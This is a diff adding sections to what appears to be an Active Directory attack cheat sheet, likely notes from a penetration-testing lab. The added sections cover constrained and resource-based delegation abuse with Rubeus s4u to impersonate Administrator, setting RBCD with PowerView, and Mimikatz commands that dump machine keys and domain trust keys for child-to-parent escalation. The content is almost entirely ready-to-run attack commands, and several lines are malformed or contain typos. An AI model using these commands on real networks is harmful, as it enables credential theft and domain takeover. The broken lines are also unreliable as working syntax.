@@ -148,25 +148,75 @@ C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 # Get users with Constraied delegation
 C:> . .\PowerView.ps1
 C:> Get-DomainUser -TrustedToAuth
+#    msds-allowedtodelegateto : {CIFS/host.domain.LOCAL, CIFS/host}    <-- Service to abuse
+#    useraccountcontrol       : TRUSTED_TO_AUTH_FOR_DELEGATION         <-- When user is trusted 
+#    samaccountname            : websvc                                <-- user name
 
 # Request a TGS for user as Domain Administrator for CIFS on host
-C:> Rubeus.exe s4u /user:<user> /aes256:<user_aes_hash> /impersonateuser:Administrator /msdsspn:"CIFS/<host_fqdn>" /ptt
+C:> Rubeus.exe s4u /user:<user> /aes256:<user_aes_hash> /impersonateuser:Administrator 
+                   /msdsspn:"CIFS/<host_fqdn>" /ptt
 ```
 ```powershell
 # Get Computer Accounts with Constrained Delegation
 C:> Get-DomainComputer -TrustedToAuth
 
 # Impersonate User Administrator using the host account
-C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuser:Administrator /msdsspn:time/<host_Fqdn> /altservice:ldap /ptt
+#   Using LDAP as the altservice, will allow to do a dcsync to dump krbgtg hash
+C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuser:Administrator 
+                   /msdsspn:time/<host_Fqdn> /altservice:ldap /ptt
 ```
 ##### Resource Based RBCD
+- Control over an object which has SPN configured
+- Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity
+```powershell
+# Use BloodHound to get Users permissions over hosts for clues
 
+# Then check potential users with following command
+C:> Find-InterestingDomainACL | ?{$_.identityreferencename | -match '<user>'
+#   ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
+#   ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
+#   SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1109
+#   IdentityReferenceName   : ciadmin
 
+# Check for RCBD enabled machnes
+C:> Get-DomainRBCD
+
+# Set RCBD on <host> for the "machines"
+C:> Set-DomainRBCD -Identity <host> -DelegateFrom 'machine1$|machine2$|machine3$' -Verbose
+
+# Get Keys for machine1, our own machine, as rcbd was configured before
+C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys" "exit"'
+
+# Abuse RBCD to access <host> as domain admin
+C:> Rubeus.exe s4u /user:machine1$ /aes256:<machine1_hash> /msdsspn:http/<host> /impersonateuser:administrator /ptt
+```
 ### DNSAdmins
+---
+### Escalate Across Trusts
+---
+##### Child to Parent sIDHistory
+```powershell
+#`sIDHistory` is a user attribute designed for scenarios where a user is moved from one domain to another. 
+# When a user's domain is changed, they get a new SID and the old SID is added to `sIDHistory`
+# AD permissions required. Get a cmd on a DA using rubeus or mimikatz
 
-### Across Trusts
+# Get Domain Trust Key in any of following ways
+C:> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-host>
+C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<parent-dc>$
+C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
-##### Child to Parent
+
+
+
+
+
+```
+
+
+
+
+
+
 
 ##### Across Forest
 
